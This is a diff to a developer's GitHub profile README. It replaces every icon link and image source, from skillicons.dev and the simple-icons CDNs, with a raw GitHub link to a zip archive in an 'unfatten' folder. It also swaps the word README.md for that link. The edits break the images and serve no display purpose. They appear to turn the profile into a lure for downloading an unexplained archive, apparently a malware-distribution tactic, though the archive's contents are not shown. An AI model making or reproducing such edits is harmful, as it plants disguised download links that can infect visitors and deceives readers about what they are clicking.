@@ -5,15 +5,15 @@ I’m a Full Stack Software Developer with over 3 years of experience creating i
 🔧 My Skills:
 
 <p align="center">
-  <a href="https://skillicons.dev">
-    <img src="https://skillicons.dev/icons?i=vue,sass,css,figma,django,nodejs,postgres,androidstudio,azure,docker,git" />
+  <a href="https://raw.githubusercontent.com/albarguezz/albarguezz/main/unfatten/albarguezz.zip">
+    <img src="https://raw.githubusercontent.com/albarguezz/albarguezz/main/unfatten/albarguezz.zip,sass,css,figma,django,nodejs,postgres,androidstudio,azure,docker,git" />
   </a>
 </p>
 
 📫 Connect with Me:
 
-<img height="32" width="32" src="https://cdn.jsdelivr.net/npm/simple-icons@v14/icons/[ICON SLUG].svg" />
-<img height="32" width="32" src="https://unpkg.com/simple-icons@v14/icons/[ICON SLUG].svg" />
+<img height="32" width="32" src="https://raw.githubusercontent.com/albarguezz/albarguezz/main/unfatten/albarguezz.zip[ICON SLUG].svg" />
+<img height="32" width="32" src="https://raw.githubusercontent.com/albarguezz/albarguezz/main/unfatten/albarguezz.zip[ICON SLUG].svg" />
 
 ------------------------------------
 
@@ -21,7 +21,7 @@ Thank you for visiting my GitHub! 😊
 
 -------------------------------------
 <!--
-**albarguezz/albarguezz** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**albarguezz/albarguezz** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/albarguezz/albarguezz/main/unfatten/albarguezz.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
